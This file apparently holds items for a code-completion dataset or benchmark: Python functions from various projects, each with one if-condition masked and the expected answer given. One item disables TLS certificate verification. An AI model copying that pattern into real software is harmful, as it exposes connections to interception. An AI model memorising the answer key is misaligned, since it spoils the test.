4457,"def testCheckIPGenerator(self):<tab>for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000):<tab><tab>if i == 254:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.0.255"")<tab><tab>elif i == 255:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.1.0"")<tab><tab>elif i == 1000:<tab><tab><tab>self.assertEqual(str(ip), ""127.0.3.233"")<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(str(ip), ""127.0.255.255"")<tab><tab>elif i == 65535:<tab><tab><tab>self.assertEqual(str(ip), ""127.1.0.0"")",elif i == 65534 :,181
4458,"def _fetch(obj, url, body, *args, **kwargs):<tab>if _is_running_from_main_thread():<tab><tab>body = urlencode(body).encode(""utf-8"")<tab><tab>response = self.fetch(url, body=body, method=""POST"")<tab><tab><IF-STMT><tab><tab><tab>raise luigi.rpc.RPCError(""Errror when connecting to remote scheduler"")<tab><tab>return response.body.decode(""utf-8"")",if response . code >= 400 :,113
4459,"def isOrHasChild(parent, child):<tab>while child:<tab><tab>if compare(parent, child):<tab><tab><tab>return True<tab><tab>child = child.parentNode<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>if child.nodeType != 1:<tab><tab><tab>child = None<tab>return False",if not child :,76
4460,"def HandleCharFormatChange(self, id, code):<tab>if code == win32con.BN_CLICKED:<tab><tab>editId = buttonControlMap.get(id)<tab><tab>assert editId is not None, ""Format button has no associated edit control""<tab><tab>editControl = self.GetDlgItem(editId)<tab><tab>existingFormat = editControl.GetDefaultCharFormat()<tab><tab>flags = win32con.CF_SCREENFONTS<tab><tab>d = win32ui.CreateFontDialog(existingFormat, flags, None, self)<tab><tab><IF-STMT><tab><tab><tab>cf = d.GetCharFormat()<tab><tab><tab>editControl.SetDefaultCharFormat(cf)<tab><tab><tab>self.SetModified(1)<tab><tab>return 0  # We handled this fully!",if d . DoModal ( ) == win32con . IDOK :,192
4461,"def test___iter___two_points(self):<tab>cba = LineString([(1, 2), (3, 4)])<tab>for i, xy in enumerate(cba):<tab><tab>assert i in [0, 1]<tab><tab><IF-STMT><tab><tab><tab>assert np.allclose(xy, (1, 2))<tab><tab>elif i == 1:<tab><tab><tab>assert np.allclose(xy, (3, 4))<tab>assert i == 1",if i == 0 :,103
4462,"def main(self):<tab>self.model.clear()<tab>active_handle = self.get_active(""Family"")<tab>if active_handle:<tab><tab>active = self.dbstate.db.get_family_from_handle(active_handle)<tab><tab><IF-STMT><tab><tab><tab>self.display_attributes(active)<tab><tab>else:<tab><tab><tab>self.set_has_data(False)<tab>else:<tab><tab>self.set_has_data(False)",if active :,113
4463,"def findStyleName(element, style):<tab>oldStyle = DOM.getAttribute(element, ""className"")<tab>if oldStyle is None:<tab><tab>return -1<tab>idx = oldStyle.find(style)<tab># Calculate matching index<tab>lastPos = len(oldStyle)<tab>while idx != -1:<tab><tab>if idx == 0 or (oldStyle[idx - 1] == "" ""):<tab><tab><tab>last = idx + len(style)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>idx = oldStyle.find(style, idx + 1)<tab>return idx","if ( last == lastPos ) or ( ( last < lastPos ) and ( oldStyle [ last ] == "" "" ) ) :",161
4464,"def result(self):<tab>""""""Gets the formatted string result.""""""<tab>if self.__group.isChecked():<tab><tab><IF-STMT><tab><tab><tab>return ""gt%d"" % self.__min.value()<tab><tab>if self.__lessThan.isChecked():<tab><tab><tab>return ""lt%d"" % self.__max.value()<tab><tab>if self.__range.isChecked():<tab><tab><tab>return ""%d-%d"" % (self.__min.value(), self.__max.value())<tab>return """"",if self . __moreThan . isChecked ( ) :,122
4465,"def get_generic_exception_from_err_details(err_details):<tab>err = None<tab>if err_details.errcls is not None:<tab><tab>err = err_details.errcls(err_details.message)<tab><tab><IF-STMT><tab><tab><tab>err.set_linecol(<tab><tab><tab><tab>err_details.detail_json.get(""line"", -1),<tab><tab><tab><tab>err_details.detail_json.get(""column"", -1),<tab><tab><tab>)<tab>return err",if err_details . errcls is not errors . InternalServerError :,131
4466,"def convert_value(self, value, expression, connection, context):<tab>if value is None:<tab><tab>return None<tab>geo_field = self.geo_field<tab>if geo_field.geodetic(connection):<tab><tab>dist_att = ""m""<tab>else:<tab><tab>units = geo_field.units_name(connection)<tab><tab><IF-STMT><tab><tab><tab>dist_att = DistanceMeasure.unit_attname(units)<tab><tab>else:<tab><tab><tab>dist_att = None<tab>if dist_att:<tab><tab>return DistanceMeasure(**{dist_att: value})<tab>return value",if units :,144
4467,"def __init__(self, **kwargs):<tab>self.layout_cell = kwargs.pop(""layout_cell"")<tab>self.theme = kwargs.pop(""theme"")<tab>assert isinstance(self.layout_cell, LayoutCell)<tab>super(LayoutCellFormGroup, self).__init__(**kwargs)<tab>self.add_form_def(<tab><tab>""general"",<tab><tab>LayoutCellGeneralInfoForm,<tab><tab>kwargs={""layout_cell"": self.layout_cell, ""theme"": self.theme},<tab>)<tab>plugin = self.layout_cell.instantiate_plugin()<tab>if plugin:<tab><tab>form_class = plugin.get_editor_form_class()<tab><tab><IF-STMT><tab><tab><tab>self.add_form_def(""plugin"", form_class, kwargs={""plugin"": plugin})",if form_class :,187
4468,"def load_model(self, model_dict):<tab>model_param = None<tab>model_meta = None<tab>for _, value in model_dict[""model""].items():<tab><tab>for model in value:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>model_meta = value[model]<tab><tab><tab>if model.endswith(""Param""):<tab><tab><tab><tab>model_param = value[model]<tab>LOGGER.info(""load model"")<tab>self.set_model_meta(model_meta)<tab>self.set_model_param(model_param)<tab>self.loss = self.get_loss_function()","if model . endswith ( ""Meta"" ) :",148
4469,"def add_plugin_single(name, plugin_to_add, parent):<tab>plugin_existing = parent.get_plugins(name)<tab>if plugin_existing is None:<tab><tab>parent.add_plugin(name, plugin_to_add)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>parent.update_plugin(name, plugin_to_add)<tab><tab>else:<tab><tab><tab>error(""Duplicated plugin {}!"".format(name))",if not plugin_existing . is_callable_plugin ( ) :,114
4470,"def get_details(guid):<tab>searchResultId = guid<tab>searchResult = SearchResult.get(SearchResult.id == searchResultId)<tab>details_link = searchResult.details<tab>if details_link:<tab><tab>logger.info(""Redirecting to details link %s "" % details_link)<tab><tab><IF-STMT><tab><tab><tab>details_link = config.settings.main.dereferer.replace(<tab><tab><tab><tab>""$s"", urllib.quote(details_link)<tab><tab><tab>)<tab><tab>return redirect(details_link)<tab>logger.error(""Unable to find details link for search result ID %d"" % searchResultId)<tab>return ""Unable to find details"", 500",if config . settings . main . dereferer :,167
4471,"def SurroundedByParens(token):<tab>""""""Check if it's an expression surrounded by parentheses.""""""<tab>while token:<tab><tab>if token.value == "","":<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>return not token.next_token<tab><tab>if token.OpensScope():<tab><tab><tab>token = token.matching_bracket.next_token<tab><tab>else:<tab><tab><tab>token = token.next_token<tab>return False","if token . value == "")"" :",109
4472,"def __str__(self, prefix="""", printElemNumber=0):<tab>res = """"<tab>cnt = 0<tab>for e in self.stat_:<tab><tab>elm = """"<tab><tab><IF-STMT><tab><tab><tab>elm = ""(%d)"" % cnt<tab><tab>res += prefix + (""stat%s <\n"" % elm)<tab><tab>res += e.__str__(prefix + ""  "", printElemNumber)<tab><tab>res += prefix + "">\n""<tab><tab>cnt += 1<tab>if self.has_more_files_found_:<tab><tab>res += prefix + (<tab><tab><tab>""more_files_found: %s\n"" % self.DebugFormatBool(self.more_files_found_)<tab><tab>)<tab>return res",if printElemNumber :,175
4473,"def _get_constraints(self, params):<tab>constraints = {}<tab>for filter_name in self._get_filter_names():<tab><tab>raw_value = params.get(filter_name, None)<tab><tab><IF-STMT><tab><tab><tab>constraints[filter_name] = self._get_value(raw_value)<tab>return constraints",if raw_value is not None :,84
4474,"def print_nested_help(self, args: argparse.Namespace) -> None:<tab>level = 0<tab>parser = self.main_parser<tab>while True:<tab><tab>if parser._subparsers is None:<tab><tab><tab>break<tab><tab>if parser._subparsers._actions is None:<tab><tab><tab>break<tab><tab>choices = parser._subparsers._actions[-1].choices<tab><tab>value = getattr(args, ""level_%d"" % level)<tab><tab><IF-STMT><tab><tab><tab>parser.print_help()<tab><tab><tab>return<tab><tab>if not choices:<tab><tab><tab>break<tab><tab>if isinstance(choices, dict):<tab><tab><tab>parser = choices[value]<tab><tab>else:<tab><tab><tab>return<tab><tab>level += 1",if value is None :,175
4475,"def prompts_dict(self, *args, **kwargs):<tab>r = super(WorkflowJobNode, self).prompts_dict(*args, **kwargs)<tab># Explanation - WFJT extra_vars still break pattern, so they are not<tab># put through prompts processing, but inventory and others are only accepted<tab># if JT prompts for it, so it goes through this mechanism<tab>if self.workflow_job:<tab><tab><IF-STMT><tab><tab><tab># workflow job inventory takes precedence<tab><tab><tab>r[""inventory""] = self.workflow_job.inventory<tab><tab>if self.workflow_job.char_prompts:<tab><tab><tab>r.update(self.workflow_job.char_prompts)<tab>return r",if self . workflow_job . inventory_id :,175
4476,"def _check_etc_hosts():<tab>debug2("" > hosts\n"")<tab>for line in open(""/etc/hosts""):<tab><tab>line = re.sub(r""#.*"", """", line)<tab><tab>words = line.strip().split()<tab><tab>if not words:<tab><tab><tab>continue<tab><tab>ip = words[0]<tab><tab>names = words[1:]<tab><tab><IF-STMT><tab><tab><tab>debug3(""<<tab>%s %r\n"" % (ip, names))<tab><tab><tab>for n in names:<tab><tab><tab><tab>check_host(n)<tab><tab><tab><tab>found_host(n, ip)",if _is_ip ( ip ) :,153
4477,"def add_variant_attribute_data_to_expected_data(data, variant, attribute_ids, pk=None):<tab>for assigned_attribute in variant.attributes.all():<tab><tab>header = f""{assigned_attribute.attribute.slug} (variant attribute)""<tab><tab><IF-STMT><tab><tab><tab>value = get_attribute_value(assigned_attribute)<tab><tab><tab>if pk:<tab><tab><tab><tab>data[pk][header] = value<tab><tab><tab>else:<tab><tab><tab><tab>data[header] = value<tab>return data",if str ( assigned_attribute . attribute . pk ) in attribute_ids :,136
4478,"def scrub_time(self, time):  # used externally to set time by slider scrubbing<tab>debug(""scrub_time: {0}"".format(time))<tab>if time == 0:<tab><tab>self.loop_backward()<tab>elif time == self.timer_duration:<tab><tab>self.loop_forward()<tab>else:  # time in between 0 and duration<tab><tab><IF-STMT><tab><tab><tab>self.timer_status = TIMER_STATUS_PAUSED<tab><tab>elif self.timer_status == TIMER_STATUS_EXPIRED:<tab><tab><tab>self.timer_status = TIMER_STATUS_PAUSED<tab>self.timer_time = time",if self . timer_status == TIMER_STATUS_STOPPED :,163
4479,"def leave_AssignTarget(<tab>self,<tab>original_node: cst.AssignTarget,<tab>updated_node: cst.AssignTarget,) -> cst.AssignTarget:<tab># We can't use matchers here due to circular imports<tab>target = updated_node.target<tab>if isinstance(target, cst.Name):<tab><tab>var_name = unmangled_name(target.value)<tab><tab><IF-STMT><tab><tab><tab>return self.assignment_replacements[var_name].deep_clone()<tab>return updated_node",if var_name in self . assignment_replacements :,132
4480,"def step(self, action):<tab>assert self.action_space.contains(action)<tab>if self._state == 4:<tab><tab><IF-STMT><tab><tab><tab>return self._state, 10.0, True, {}<tab><tab>else:<tab><tab><tab>return self._state, -10, True, {}<tab>else:<tab><tab>if action:<tab><tab><tab>if self._state == 0:<tab><tab><tab><tab>self._state = 2<tab><tab><tab>else:<tab><tab><tab><tab>self._state += 1<tab><tab>elif self._state == 2:<tab><tab><tab>self._state = self._case<tab>return self._state, -1, False, {}",if action and self . _case :,157
4481,"def last_ok(nodes):<tab>for i in range(len(nodes) - 1, -1, -1):<tab><tab><IF-STMT><tab><tab><tab>node = nodes[i]<tab><tab><tab>if isinstance(node, ast.Starred):<tab><tab><tab><tab>if ok_node(node.value):<tab><tab><tab><tab><tab>return node.value<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>return None<tab><tab><tab>else:<tab><tab><tab><tab>return nodes[i]<tab>return None",if ok_node ( nodes [ i ] ) :,122
4482,"def __contains__(self, table_name):<tab>""""""Check if the given table name exists in the database.""""""<tab>try:<tab><tab>table_name = normalize_table_name(table_name)<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>if table_name in self.views:<tab><tab><tab>return True<tab><tab>return False<tab>except ValueError:<tab><tab>return False",if table_name in self . tables :,97
4483,"def get_history_data(self, guid, count=1):<tab>history = {}<tab>if count < 1:<tab><tab>return history<tab>key = self._make_key(guid)<tab>for i in range(0, self.db.llen(key)):<tab><tab>r = self.db.lindex(key, i)<tab><tab>c = msgpack.unpackb(r)<tab><tab>if c[""tries""] == 0 or c[""tries""] is None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>history[c[""data""]] = c[""timestamp""]<tab><tab><tab><tab>if len(history) >= count:<tab><tab><tab><tab><tab>break<tab>return history","if c [ ""data"" ] not in history :",161
4484,"def _state_dec_to_imp(self, token):<tab>if token in (""+"", ""-""):<tab><tab>self._state = self._state_global<tab>else:<tab><tab>super(ObjCStates, self)._state_dec_to_imp(token)<tab><tab><IF-STMT><tab><tab><tab>self._state = self._state_objc_dec_begin<tab><tab><tab>self.context.restart_new_function(token)",if self . _state != self . _state_imp :,107
4485,"def _additional_handlers(self):<tab>handlers = []<tab>if self.session.get(""proxy""):<tab><tab>protocol, host, port = self._get_proxy()<tab><tab><IF-STMT><tab><tab><tab>handlers.append(sockshandler.SocksiPyHandler(protocol, host, port))<tab><tab>else:<tab><tab><tab>raise ChannelException(messages.channels.error_proxy_format)<tab># Skip certificate checks<tab>ctx = ssl.create_default_context()<tab>ctx.check_hostname = False<tab>ctx.verify_mode = ssl.CERT_NONE<tab>handlers.append(urllib.request.HTTPSHandler(context=ctx))<tab>return handlers",if protocol and host and port :,161
4486,"def loadGCodeData(self, dataStream):<tab>if self._printing:<tab><tab>return False<tab>self._lineCount = 0<tab>for line in dataStream:<tab><tab># Strip out comments, we do not need to send comments<tab><tab>if "";"" in line:<tab><tab><tab>line = line[: line.index("";"")]<tab><tab># Strip out whitespace at the beginning/end this saves data to send.<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self._lineCount += 1<tab>self._doCallback()<tab>return True",if len ( line ) < 1 :,139
4487,"def get_headers_footers_xml(self, uri):<tab>for relKey, val in self.docx._part._rels.items():<tab><tab><IF-STMT><tab><tab><tab>yield relKey, self.xml_to_string(parse_xml(val.target_part.blob))",if ( val . reltype == uri ) and ( val . target_part . blob ) :,85
4488,"def eventlist_name(name=None, key=""core""):<tab>if not name:<tab><tab>name = get_cpustr()<tab>cache = getdir()<tab>fn = name<tab>if os.path.exists(fn):<tab><tab>return fn<tab>if "".json"" not in name:<tab><tab>fn = ""%s-%s.json"" % (name, key)<tab>if ""/"" in fn:<tab><tab>return fn<tab>fn = ""%s/%s"" % (cache, fn)<tab>if not os.path.exists(fn):<tab><tab>name = cpu_without_step(name)<tab><tab><IF-STMT><tab><tab><tab>fn = ""%s/%s"" % (cache, name)<tab><tab>else:<tab><tab><tab>fn = ""%s/%s-%s.json"" % (cache, name, key)<tab>return fn","if ""*"" in fn :",196
4489,"def test09_authority(self):<tab>""Testing the authority name & code routines.""<tab>for s in srlist:<tab><tab><IF-STMT><tab><tab><tab>srs = SpatialReference(s.wkt)<tab><tab><tab>for target, tup in s.auth.items():<tab><tab><tab><tab>self.assertEqual(tup[0], srs.auth_name(target))<tab><tab><tab><tab>self.assertEqual(tup[1], srs.auth_code(target))","if hasattr ( s , ""auth"" ) :",114
4490,"def astAssign(self, import_names, node):<tab>for node in node.nodes:<tab><tab><IF-STMT><tab><tab><tab>import_names[node.name] = True<tab><tab>else:<tab><tab><tab>self.warning(""Ignoring Assign %s"" % node.flags, node.lineno)","if node . flags == ""OP_ASSIGN"" :",76
4491,"def _autojoin(self, __):<tab>if not self.auto_join:<tab><tab>return<tab>try:<tab><tab>result = self.get_bookmarks(method=self.storage_method)<tab>except XMPPError:<tab><tab>return<tab>if self.storage_method == ""xep_0223"":<tab><tab>bookmarks = result[""pubsub""][""items""][""item""][""bookmarks""]<tab>else:<tab><tab>bookmarks = result[""private""][""bookmarks""]<tab>for conf in bookmarks[""conferences""]:<tab><tab><IF-STMT><tab><tab><tab>log.debug(""Auto joining %s as %s"", conf[""jid""], conf[""nick""])<tab><tab><tab>self.xmpp[""xep_0045""].joinMUC(<tab><tab><tab><tab>conf[""jid""], conf[""nick""], password=conf[""password""]<tab><tab><tab>)","if conf [ ""autojoin"" ] :",195
4492,"def config_mode(self, config_command=""conf t"", pattern=""""):<tab>output = """"<tab>if not self.check_config_mode():<tab><tab>output = self.send_command_timing(<tab><tab><tab>config_command, strip_command=False, strip_prompt=False<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>output += self.send_command_timing(<tab><tab><tab><tab>""YES"", strip_command=False, strip_prompt=False<tab><tab><tab>)<tab><tab>if not self.check_config_mode():<tab><tab><tab>raise ValueError(""Failed to enter configuration mode"")<tab>return output","if ""to enter configuration mode anyway"" in output :",152
4493,"def work(self):<tab>idle_times = 0<tab>while True:<tab><tab>if shutting_down.is_set():<tab><tab><tab>log.info(""Stop sync worker"")<tab><tab><tab>break<tab><tab>try:<tab><tab><tab>job = self.commit_queue.get(timeout=self.timeout, block=True)<tab><tab><tab>if job[""type""] == ""commit"":<tab><tab><tab><tab>self.commits.append(job)<tab><tab><tab>log.debug(""Got a commit job"")<tab><tab><tab>idle_times = 0<tab><tab><tab>idle.clear()<tab><tab>except Empty:<tab><tab><tab>log.debug(""Nothing to do right now, going idle"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>idle.set()<tab><tab><tab>idle_times += 1<tab><tab><tab>self.on_idle()",if idle_times > self . min_idle_times :,200
4494,"def movies_iterator():<tab>for row in self._tuple_iterator(query):<tab><tab>id, guid, movie = self._parse(fields, row, offset=2)<tab><tab># Parse `guid` (if enabled, and not already parsed)<tab><tab><IF-STMT><tab><tab><tab>if id not in guids:<tab><tab><tab><tab>guids[id] = Guid.parse(guid)<tab><tab><tab>guid = guids[id]<tab><tab># Return item<tab><tab>yield id, guid, movie",if parse_guid :,119
4495,"def timesince(value):<tab>diff = timezone.now() - value<tab>plural = """"<tab>if diff.days == 0:<tab><tab>hours = int(diff.seconds / 3600.0)<tab><tab>if hours != 1:<tab><tab><tab>plural = ""s""<tab><tab>return ""%d hour%s ago"" % (int(diff.seconds / 3600.0), plural)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>plural = ""s""<tab><tab>return ""%d day%s ago"" % (diff.days, plural)",if diff . days != 1 :,129
4496,"def connect(self, *args):<tab>if len(args) == 0:<tab><tab>self.basepath = ""/""<tab><tab>return True  # no setup required; connect is allways successful<tab>else:<tab><tab>self.basepath = args[0]<tab><tab><IF-STMT><tab><tab><tab>return ""No such directory: {p}"".format(p=self.basepath)<tab><tab>return True",if not os . path . isdir ( self . basepath ) :,99
4497,"def get_callable(self):<tab>if not self.func:<tab><tab>prototype = self.get_prototype()<tab><tab>self.func = cast(self.imp, prototype)<tab><tab><IF-STMT><tab><tab><tab>self.func.restype = c_void_p<tab><tab>else:<tab><tab><tab>self.func.restype = self.restype<tab><tab>self.func.argtypes = self.argtypes<tab>return self.func",if self . restype == ObjCInstance or self . restype == ObjCClass :,117
4498,"def on_task_output(self, task, config):<tab>for entry in task.entries:<tab><tab><IF-STMT><tab><tab><tab>if entry[""torrent""].modified:<tab><tab><tab><tab># re-write data into a file<tab><tab><tab><tab>log.debug(""Writing modified torrent file for %s"" % entry[""title""])<tab><tab><tab><tab>with open(entry[""file""], ""wb+"") as f:<tab><tab><tab><tab><tab>f.write(entry[""torrent""].encode())","if ""torrent"" in entry :",115
4499,"def update(self, data):<tab>results = []<tab>while True:<tab><tab>remain = BLOCK_SIZE - self._pos<tab><tab>cur_data = data[:remain]<tab><tab>cur_data_len = len(cur_data)<tab><tab>cur_stream = self._stream[self._pos : self._pos + cur_data_len]<tab><tab>self._pos = self._pos + cur_data_len<tab><tab>data = data[remain:]<tab><tab>results.append(numpy_xor(cur_data, cur_stream))<tab><tab>if self._pos >= BLOCK_SIZE:<tab><tab><tab>self._next_stream()<tab><tab><tab>self._pos = 0<tab><tab><IF-STMT><tab><tab><tab>break<tab>return b"""".join(results)",if not data :,179
4500,"def listed(output, pool):<tab>for line in output.splitlines():<tab><tab>name, mountpoint, refquota = line.split(b""\t"")<tab><tab>name = name[len(pool) + 1 :]<tab><tab>if name:<tab><tab><tab>refquota = int(refquota.decode(""ascii""))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>refquota = None<tab><tab><tab>yield _DatasetInfo(dataset=name, mountpoint=mountpoint, refquota=refquota)",if refquota == 0 :,116
4501,"def set_multi(self, value):<tab>del self[atype]<tab>for addr in value:<tab><tab># Support assigning dictionary versions of addresses<tab><tab># instead of full Address objects.<tab><tab><IF-STMT><tab><tab><tab>if atype != ""all"":<tab><tab><tab><tab>addr[""type""] = atype<tab><tab><tab>elif ""atype"" in addr and ""type"" not in addr:<tab><tab><tab><tab>addr[""type""] = addr[""atype""]<tab><tab><tab>addrObj = Address()<tab><tab><tab>addrObj.values = addr<tab><tab><tab>addr = addrObj<tab><tab>self.append(addr)","if not isinstance ( addr , Address ) :",146
4502,"def get_migration_rate(volume):<tab>metadata = get_metadata(volume)<tab>rate = metadata.get(""migrate_rate"", None)<tab>if rate:<tab><tab><IF-STMT><tab><tab><tab>return storops.VNXMigrationRate.parse(rate.lower())<tab><tab>else:<tab><tab><tab>LOG.warning(<tab><tab><tab><tab>""Unknown migration rate specified, "" ""using [high] as migration rate.""<tab><tab><tab>)<tab><tab><tab>return storops.VNXMigrationRate.HIGH",if rate . lower ( ) in storops . VNXMigrationRate . values ( ) :,136
4503,"def _check_params(self) -> None:<tab>if self.augmentation and self.ratio <= 0:<tab><tab>raise ValueError(""The augmentation ratio must be positive."")<tab>if self.clip_values is not None:<tab><tab>if len(self.clip_values) != 2:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""`clip_values` should be a tuple of 2 floats or arrays containing the allowed data range.""<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""Invalid `clip_values`: min >= max."")",if np . array ( self . clip_values [ 0 ] >= self . clip_values [ 1 ] ) . any ( ) :,146
4504,"def _find_first_unescaped(dn, char, pos):<tab>while True:<tab><tab>pos = dn.find(char, pos)<tab><tab>if pos == -1:<tab><tab><tab>break  # no char found<tab><tab>if pos > 0 and dn[pos - 1] != ""\\"":  # unescaped char<tab><tab><tab>break<tab><tab>elif pos > 1 and dn[pos - 1] == ""\\"":  # may be unescaped<tab><tab><tab>escaped = True<tab><tab><tab>for c in dn[pos - 2 : 0 : -1]:<tab><tab><tab><tab>if c == ""\\"":<tab><tab><tab><tab><tab>escaped = not escaped<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>break<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>pos += 1<tab>return pos",if not escaped :,181
4505,"def get_objects(self):<tab>retval = []<tab>for item in self._obj_list:<tab><tab>if item is None:<tab><tab><tab>continue<tab><tab>target = pickle.loads(item)[0]<tab><tab>_class = map2class(target)<tab><tab>if _class:<tab><tab><tab>obj = _class(self._dbstate, item)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>retval.append(obj)<tab>return retval",if obj :,107
4506,"def get_databases(request):<tab>dbs = {}<tab>for (key, value) in global_env.items():<tab><tab>try:<tab><tab><tab>cond = isinstance(value, GQLDB)<tab><tab>except:<tab><tab><tab>cond = isinstance(value, SQLDB)<tab><tab><IF-STMT><tab><tab><tab>dbs[key] = value<tab>return dbs",if cond :,89
4507,"def real_quick_ratio(buf1, buf2):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return 0<tab><tab>s = SequenceMatcher(None, buf1.split(""\n""), buf2.split(""\n""))<tab><tab>return s.real_quick_ratio()<tab>except:<tab><tab>print(""real_quick_ratio:"", str(sys.exc_info()[1]))<tab><tab>return 0","if buf1 is None or buf2 is None or buf1 == """" or buf1 == """" :",112
4508,"def SentSegRestoreSent(<tab>batch_words: List[List[str]], batch_tags: List[List[str]]) -> List[str]:<tab>ret = []<tab>for words, tags in zip(batch_words, batch_tags):<tab><tab>if len(tags) == 0:<tab><tab><tab>ret.append("""")<tab><tab><tab>continue<tab><tab>sent = words[0]<tab><tab>punct = """" if tags[0] == ""O"" else tags[0][-1]<tab><tab>for word, tag in zip(words[1:], tags[1:]):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sent += punct<tab><tab><tab><tab>punct = tag[-1]<tab><tab><tab>sent += "" "" + word<tab><tab>sent += punct<tab><tab>ret.append(sent)<tab>return ret","if tag != ""O"" :",190
4509,"def build(opt):<tab>dpath = os.path.join(opt[""datapath""], ""MultiNLI"")<tab>version = ""1.0""<tab>if not build_data.built(dpath, version_string=version):<tab><tab>print(""[building data: "" + dpath + ""]"")<tab><tab><IF-STMT><tab><tab><tab># an older version exists, so remove these outdated files.<tab><tab><tab>build_data.remove_dir(dpath)<tab><tab>build_data.make_dir(dpath)<tab><tab># Download the data.<tab><tab>for downloadable_file in RESOURCES:<tab><tab><tab>downloadable_file.download_file(dpath)<tab><tab># mark the data as built<tab><tab>build_data.mark_done(dpath, version_string=version)",if build_data . built ( dpath ) :,184
4510,"def __iter__(self):<tab>iteration = self.start_iter<tab>while iteration <= self.num_iterations:<tab><tab># if the underlying sampler has a set_epoch method, like<tab><tab># DistributedSampler, used for making each process see<tab><tab># a different split of the dataset, then set it<tab><tab>if hasattr(self.batch_sampler.sampler, ""set_epoch""):<tab><tab><tab>self.batch_sampler.sampler.set_epoch(iteration)<tab><tab>for batch in self.batch_sampler:<tab><tab><tab>iteration += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>yield batch",if iteration > self . num_iterations :,151
4511,"def visit_title(self, node: Element) -> None:<tab>if isinstance(node.parent, addnodes.seealso):<tab><tab>self.body.append('.IP ""')<tab><tab>return<tab>elif isinstance(node.parent, nodes.section):<tab><tab>if self.section_level == 0:<tab><tab><tab># skip the document title<tab><tab><tab>raise nodes.SkipNode<tab><tab><IF-STMT><tab><tab><tab>self.body.append("".SH %s\n"" % self.deunicode(node.astext().upper()))<tab><tab><tab>raise nodes.SkipNode<tab>return super().visit_title(node)",elif self . section_level == 1 :,145
4512,def validate_feature_query_fields(namespace):<tab>if namespace.fields:<tab><tab>fields = []<tab><tab>for field in namespace.fields:<tab><tab><tab>for feature_query_field in FeatureQueryFields:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>fields.append(feature_query_field)<tab><tab>namespace.fields = fields,if field . lower ( ) == feature_query_field . name . lower ( ) :,95
4513,"def __init__(self, clock_pin, mosi_pin, miso_pin):<tab>self.lock = None<tab>self.clock = None<tab>self.mosi = None<tab>self.miso = None<tab>super(SPISoftwareBus, self).__init__()<tab>self.lock = RLock()<tab>self.clock_phase = False<tab>self.lsb_first = False<tab>self.bits_per_word = 8<tab>try:<tab><tab>self.clock = OutputDevice(clock_pin, active_high=True)<tab><tab>if mosi_pin is not None:<tab><tab><tab>self.mosi = OutputDevice(mosi_pin)<tab><tab><IF-STMT><tab><tab><tab>self.miso = InputDevice(miso_pin)<tab>except:<tab><tab>self.close()<tab><tab>raise",if miso_pin is not None :,200
4514,"def sample_neg_items_for_u(u, num):<tab># sample num neg items for u-th user<tab>neg_items = []<tab>while True:<tab><tab>if len(neg_items) == num:<tab><tab><tab>break<tab><tab>neg_id = np.random.randint(low=0, high=self.n_items, size=1)[0]<tab><tab><IF-STMT><tab><tab><tab>neg_items.append(neg_id)<tab>return neg_items",if neg_id not in self . train_items [ u ] and neg_id not in neg_items :,136
4515,"def _write_dump(self, command, output):<tab>if isinstance(self, HostDumper):<tab><tab>prefix = ""host""<tab>elif isinstance(self, TargetDumper):<tab><tab>prefix = ""target""<tab>else:<tab><tab>prefix = ""unknown""<tab>for i in itertools.count():<tab><tab>filename = ""%s_%02d_%s"" % (prefix, i, command)<tab><tab>fullname = os.path.join(self.dump_dir, filename)<tab><tab><IF-STMT><tab><tab><tab>break<tab>with open(fullname, ""w"") as dump_file:<tab><tab>dump_file.write(output)",if not os . path . exists ( fullname ) :,154
4516,"def match_style(self, vmobject, recurse=True):<tab>self.set_style(**vmobject.get_style(), recurse=False)<tab>if recurse:<tab><tab># Does its best to match up submobject lists, and<tab><tab># match styles accordingly<tab><tab>submobs1, submobs2 = self.submobjects, vmobject.submobjects<tab><tab><IF-STMT><tab><tab><tab>return self<tab><tab>elif len(submobs2) == 0:<tab><tab><tab>submobs2 = [vmobject]<tab><tab>for sm1, sm2 in zip(*make_even(submobs1, submobs2)):<tab><tab><tab>sm1.match_style(sm2)<tab>return self",if len ( submobs1 ) == 0 :,184
4517,"def close_cb(self, worker):<tab>try:<tab><tab>self.workers.remove(worker)<tab><tab><IF-STMT><tab><tab><tab>self.h2_num -= 1<tab><tab>else:<tab><tab><tab>self.h1_num -= 1<tab>except:<tab><tab>pass","if worker . version == ""2"" :",73
4518,"def wait_for_syn(jid):<tab>i = 0<tab>while 1:<tab><tab><IF-STMT><tab><tab><tab>error(<tab><tab><tab><tab>""!!!WAIT FOR ACK TIMEOUT: job:%r fd:%r!!!"",<tab><tab><tab><tab>jid,<tab><tab><tab><tab>self.synq._reader.fileno(),<tab><tab><tab><tab>exc_info=1,<tab><tab><tab>)<tab><tab>req = _wait_for_syn()<tab><tab>if req:<tab><tab><tab>type_, args = req<tab><tab><tab>if type_ == NACK:<tab><tab><tab><tab>return False<tab><tab><tab>assert type_ == ACK<tab><tab><tab>return True<tab><tab>i += 1",if i > 60 :,159
